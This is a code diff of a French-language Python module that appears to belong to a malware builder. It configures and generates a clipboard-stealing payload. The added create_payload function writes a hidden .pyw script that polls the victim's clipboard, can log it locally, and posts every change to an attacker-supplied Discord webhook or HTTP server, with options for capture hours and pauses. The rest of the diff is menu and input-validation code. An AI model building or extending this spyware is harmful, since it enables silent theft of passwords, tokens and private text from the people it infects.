@@ -15,21 +15,18 @@ def affichage():
 
     1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
     2. Type de données à capturer (texte, images, etc.)
-    3. Taile maximale du clipboard à capturer en Mo
-    4. Limite de débit envois/minute
-    5. Seuil de longueur du texte à capturer
-    6. Heure de début de capture (HH:MM)
-    7. Heure de fin de capture (HH:MM)
-    8. Début Pause de capture (HH:MM)
-    9. Fin Pause de capture (HH:MM)
-    10. Sauvegarde locale
+    3. Heure de début de capture (HH:MM)
+    4. Heure de fin de capture (HH:MM)
+    5. Début Pause de capture (HH:MM)
+    6. Fin Pause de capture (HH:MM)
+    7. Sauvegarde locale
         
          
           Sortie et envoi:
 
-    11. Envoi sur discord
-    12. Envoi par email
-    13. Envoi sur serveur HTTP
+    8. Envoi sur discord
+    9. Envoi par email
+    10. Envoi sur serveur HTTP
                       
  Tapez: set <num> pour configurer une option, ou exit pour quitter. 
  Tapez: show pour afficher la configuration actuelle.
@@ -40,11 +37,26 @@ def affichage():
 def clipboard_module():
     clear()
     print("=== Clipboard Configuration ===\n\n")
-    choix = {}            
+    choix = {
+        "Intervalle de capture": None,
+        "Type de données à capturer": None,
+        "Taille maximale du clipboard (Mo)": None,
+        "Limite de débit (envois/minute)": None,
+        "Seuil de longueur du texte": None,
+        "Heure de début de capture": None,
+        "Heure de fin de capture": None,
+        "Début Pause de capture": None,
+        "Fin Pause de capture": None,
+        "Sauvegarde locale": None,
+        "Envoi sur Discord": None,
+        "Envoi par email": None,
+        "Envoi sur serveur HTTP": None,
+    }            
 
-    def intervalle_capture_donne():
+    def intervalle_capture():
         clear()
         print("Définir l'intervalle de capture en secondes.\n\n")
+
         intervalle = input("""Intervalle (secondes) 'random' pour un temps entre 1 et 10 secondes : """)
         try:
             if intervalle.lower() == 'random':
@@ -53,17 +65,20 @@ def clipboard_module():
                 time.sleep(2)
                 choix["Intervalle de capture"] = intervalle
             else:
-                choix["Intervalle de capture"] = intervalle
-                print(f"Intervalle défini sur {intervalle} secondes.")
-                time.sleep(2)
+                if int(intervalle) <= 0:
+                    print(Fore.RED + "Veuillez entrer un nombre positif." + Style.RESET_ALL)
+                    time.sleep(2)
+                    return
+                else:
+                    choix["Intervalle de capture"] = int(intervalle)
+                    print(f"Intervalle défini sur {intervalle} secondes.")
+                    time.sleep(2)
         except ValueError:
             print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
             time.sleep(2)
 
-    def intervalle_capture():
 
-
-    def type_donnees_donne():  
+    def type_donnees():  
         clear()
         data_type = input("Définir le type de données à capturer (texte, images) : ")
         choix["Type de données à capturer"] = data_type
@@ -71,119 +86,59 @@ def clipboard_module():
         time.sleep(2)  
 
 
-    def type_donnees():
-
-
-    def taille_maximale_donne():
-        clear()
+    def valide_heure(h):
         try:
-            taille = int(input("Définir la taille maximale du clipboard à capturer en Mo : "))
-            choix["Taille maximale du clipboard (Mo)"] = taille
-            print(f"Taille maximale définie sur {taille} Mo.")
-            time.sleep(2)
-        except ValueError:
-            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
-            time.sleep(2)
-
-
-    def taille_maximale():
-
-    def limite_debit_donne():
-        clear()
-        limite = int(input("Définir la limite de débit en envois/minute : "))
-        choix["Limite de débit (envois/minute)"] = limite
-        print(f"Limite de débit définie sur {limite} envois/minute.")
-        time.sleep(2)
-
-    def limite_debit():
-
-    def seuil_longueur_donne():
-        clear()
-        long = int(input("Définir le seuil de longueur maximum du texte à capturer : "))
-        choix["Seuil de longueur du texte"] = long
-        print(f"Seuil de longueur défini sur {long}.")
-        time.sleep(2)
-
-    def seuil_longueur():
-
-    def valide_heure():
-        try:
-            time.strptime("%H:%M")
+            time.strptime(h, "%H:%M")
             return True
         except ValueError:
             return False
 
-    def heure_debut_donne():
-        clear()
-        heure_debut = input("HH:MM de début : ")
-        if not valide_heure(heure_debut):
-            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
-            time.sleep(2)
-            return
-        choix["Heure de début de capture"] = heure_debut
-        print(f"Heure de début de capture définie sur {heure_debut}.")
-        time.sleep(2)
-
     def heure_debut():
-     
-    def heure_fin_donne():
         clear()
-        heure_fin = input("HH:MM de fin : ")
-        if not valide_heure(heure_fin):
-            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
+        h = input("HH:MM de début : ")
+        if valide_heure(h):
+            choix["Heure de début de capture"] = h
+        else:
+            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
             time.sleep(2)
-            return
-        choix["Heure de fin de capture"] = heure_fin
-        print(f"Heure de fin de capture définie sur {heure_fin}.")
-        time.sleep(2)
 
     def heure_fin():
-
-    def debut_pause_donne():
         clear()
-        heure_debut_pause = input("Définir l'heure de début de la pause de capture (HH:MM) : ")
-        if not valide_heure(heure_debut_pause):
-            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
+        h = input("HH:MM de fin : ")
+        if valide_heure(h):
+            choix["Heure de fin de capture"] = h
+        else:
+            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
             time.sleep(2)
-            return
-        choix["Début Pause de capture"] = heure_debut_pause
-        print(f"Heure de début de la pause de capture définie sur {heure_debut_pause}.")
-        time.sleep(2)
 
     def debut_pause():
-
-    def fin_pause_donne():
         clear()
-        heure_fin_pause = input("Définir l'heure de fin de la pause de capture (HH:MM) : ")
-        if not valide_heure(heure_fin_pause):
-            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
+        h = input("HH:MM début pause : ")
+        if valide_heure(h):
+            choix["Début Pause de capture"] = h
+        else:
+            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
             time.sleep(2)
-            return
-        choix["Fin Pause de capture"] = heure_fin_pause
-        print(f"Heure de fin de la pause de capture définie sur {heure_fin_pause}.")
-        time.sleep(2)
 
     def fin_pause():
+        clear()
+        h = input("HH:MM fin pause : ")
+        if valide_heure(h):
+            choix["Fin Pause de capture"] = h
+        else:
+            print(Fore.RED + "Format invalide." + Style.RESET_ALL)
+            time.sleep(2)
 
     def sauvegarde_locale():
         clear()
-        reponse = input("Activer la sauvegarde locale ? (yes/no) : ")
-        choix["Sauvegarde locale"] = (reponse.lower() == "yes")
-        print(f"Sauvegarde locale {'activée' if reponse.lower() == 'yes' else 'désactivée'}.")
+        save_local = input("Entrez le chemin de sauvegarde locale (C:/path/to/save) (pas le nom du fichier): ")
+        choix["Sauvegarde locale"] = save_local
         time.sleep(2)
-
 
     def envoi_discord():
         clear()
         webhook = input("Entrez l'URL du webhook discord : ")
         choix["Envoi sur Discord"] = webhook
-        time.sleep(2)
-
-    def envoi_email():
-        clear()
-        reponse = input("Activer l'envoi par email ? (yes/no) : ")
-        choix.append(("Envoi par email", reponse.lower() == 'yes'))
-        print(f"Envoi par email {'activé' if reponse.lower() == 'yes' else 'désactivé'}.")
         time.sleep(2)
 
     def envoi_http():
@@ -192,65 +147,72 @@ def clipboard_module():
         choix["Envoi sur serveur HTTP"] = reponse
         time.sleep(2)
 
-
-
-    import clipboard
-    import requests
-
-    def clipboard_option_func():
-        old = clipboard.paste()
-
-        def envoyer():
-            if "Envoi sur Discord" in choix:
-                webhook_url = choix["Envoi sur Discord"]
-                data = {"content": old}
-                try:
-                    response = requests.post(webhook_url, json=data)
-                    if response.status_code == 204:
-                        print("Données envoyées sur Discord avec succès.")
-                    else:
-                        print(f"Échec de l'envoi sur Discord. Statut : {response.status_code}")
-                except requests.exceptions.RequestException as e:
-                    print(f"Erreur lors de l'envoi sur Discord : {e}")
-            if "Envoi sur serveur HTTP" in choix:
-                reponse = choix["Envoi sur serveur HTTP"]
-                data = {"clipboard_data": old}
-                try:
-                    response = requests.post(reponse, json=data)
-                    if response.status_code == 200:
-                        print("Données envoyées sur le serveur HTTP avec succès.")
-                    else:
-                        print(f"Échec de l'envoi sur le serveur HTTP. Statut : {response.status_code}")
-                except requests.exceptions.RequestException as e:
-                    print(f"Erreur lors de l'envoi sur le serveur HTTP : {e}")
-            
-        
-
-
-
-
-
     options = [
         ("Intervalle de capture (en secondes)", intervalle_capture),
         ("Type de données à capturer (texte, images, etc.)" , type_donnees),
-        ("Taile maximale du clipboard à capturer en Mo" , taille_maximale),
-        ("Limite de débit envois/minute" , limite_debit),
-        ("Seuil de longueur du texte à capturer" , seuil_longueur),
         ("Heure de début de capture (HH:MM)" , heure_debut),
         ("Heure de fin de capture (HH:MM)" , heure_fin),
         ("Début Pause de capture (HH:MM)" , debut_pause),
         ("Fin Pause de capture (HH:MM)" , fin_pause),
         ("Sauvegarde locale " , sauvegarde_locale),
         ("Envoi sur discord" , envoi_discord),
-        ("Envoi par email" , envoi_email),
         ("Envoi sur serveur HTTP" , envoi_http),
     ]
-
+    
     def create_payload():
         with open("Option/modules/payload/payload_created/clipboard_payload.pyw", "w") as f:
-            for option, value in choix.items():
-                f.write(f"def clipboard():\n")
-            f.write(f"\n")
+
+            # IMPORT
+            f.write("import clipboard\n")
+            f.write("import time\n")
+            f.write("import requests\n\n")
+
+            # Début fonction clipboard
+            f.write("def clipboard_monitor():\n")
+
+            # Choisir la méthode selon le type
+            getter = "clipboard.paste()" if choix["Type de données à capturer"] in [None, "texte"] else "clipboard.get_image()"
+
+            # Intervalle
+            intervalle = choix["Intervalle de capture"] or 2
+
+            f.write(f"    old = {getter}\n")
+            f.write("    message = 'Presse papier : '\n")
+            f.write("    while True:\n")
+            f.write(f"        time.sleep({intervalle})\n")
+            f.write("        current_time = time.strftime('%H:%M')\n")
+
+            # Heure de début et fin
+            if choix["Heure de début de capture"] and choix["Heure de fin de capture"]:
+                f.write(f"        if current_time < '{choix['Heure de début de capture']}' or current_time > '{choix['Heure de fin de capture']}':\n")
+                f.write("            time.sleep(60)\n")
+                f.write("            continue\n")
+
+            # Début et fin pause
+            if choix["Début Pause de capture"] and choix["Fin Pause de capture"]:
+                f.write(f"        if '{choix['Début Pause de capture']}' <= current_time <= '{choix['Fin Pause de capture']}':\n")
+                f.write("            time.sleep(60)\n")
+                f.write("            continue\n")
+
+            # Lecture clipboard
+            f.write(f"        mtn = {getter}\n")
+            f.write("        if old != mtn:\n")
+            f.write("            old = mtn\n")
+
+            # Sauvegarde locale
+            if choix["Sauvegarde locale"]:
+                f.write(f"            with open(r'{choix['Sauvegarde locale']}\\clipboard_log.txt', 'a') as file:\n")
+                f.write("                file.write(message + str(mtn) + '\\n')\n")
+
+            # Envoi Discord
+            if choix["Envoi sur Discord"]:
+                f.write(f"            requests.post('{choix['Envoi sur Discord']}', data={{'content': message + str(mtn)}})\n")
+
+            # Envoi HTTP
+            if choix["Envoi sur serveur HTTP"]:
+                f.write(f"            requests.post('{choix['Envoi sur serveur HTTP']}', data={{'clipboard': message + str(mtn)}})\n")
+
+            f.write("\nclipboard_monitor()\n")
 
     while True:
         affichage()
@@ -263,7 +225,7 @@ def clipboard_module():
             try:
                 option_choix = int(cmd.split()[1]) - 1
                 if 0 <= option_choix < len(options):
-                    options[option_choix][1]()  # Appelle la fonction associée à l'option
+                    options[option_choix][1]()
                 else:
                     print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
             except ValueError:
@@ -278,7 +240,3 @@ def clipboard_module():
         if cmd.lower() == "create":
             create_payload()
             break
-        
-
-
-clipboard_module()
